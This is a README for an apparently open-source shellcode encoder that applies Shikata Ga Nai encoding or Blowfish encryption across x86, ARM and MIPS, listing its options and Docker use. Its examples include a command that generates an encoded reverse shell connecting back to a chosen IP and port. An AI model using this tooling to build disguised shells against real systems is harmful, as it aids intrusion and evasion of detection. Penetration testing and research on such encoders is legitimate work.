
# Shikata Ga Nai Encoder

This project provides a custom implementation of the Shikata Ga Nai encoder for multiple architectures, including x86, ARM, and MIPS, with support for both 32-bit and 64-bit systems. It allows for encoding shellcode using the Shikata Ga Nai technique, avoiding nulls and newlines, and offers flexible encryption using Blowfish. 

## Features
- Supports **x86**, **ARM**, and **MIPS** architectures.
- Both **32-bit** and **64-bit** versions supported.
- Custom Shikata Ga Nai encoding without external libraries like pwntools.
- Optional Blowfish encryption.
- Avoids nulls and newlines in shellcode.

## Command Line Options

- `--arch`: Select the architecture (`x86`, `arm`, `mips`) [default: `x86`].
- `--shellcode`: Choose the shellcode type (`execve`, `reverse`, `bind`, `uname`) [default: `execve`].
- `--ip`: IP address for reverse shell [default: `127.0.0.1`].
- `--port`: Port for reverse or bind shell [default: `8888`].
- `--debug`: Enable debug breakpoint.
- `--pusscat`: Use Shikata Ga Nai encoding instead of Blowfish encryption.
- `--bitness`: Choose between 32-bit and 64-bit for the selected architecture [default: `32`].

## Usage Examples

### 1. Run `uname -a` shellcode with Blowfish encryption (default)
```bash
python3 shikata_ga_nai.py --arch x86 --shellcode uname
```

### 2. Run `uname -a` shellcode with Shikata Ga Nai encoding for ARM 64-bit
```bash
python3 shikata_ga_nai.py --arch arm --bitness 64 --shellcode uname --pusscat
```

### 3. Run reverse shell for MIPS with Shikata Ga Nai encoding for 32-bit
```bash
python3 shikata_ga_nai.py --arch mips --bitness 32 --shellcode reverse --pusscat --ip 192.168.1.100 --port 4444
```

## Docker Usage

You can build and run this project using Docker. 

### Build the Docker Image:
```bash
docker build -t shikata_ga_nai_encoder .
```

### Run the Docker Container:
```bash
docker run --rm shikata_ga_nai_encoder
```

## License
This project is licensed under the MIT License.
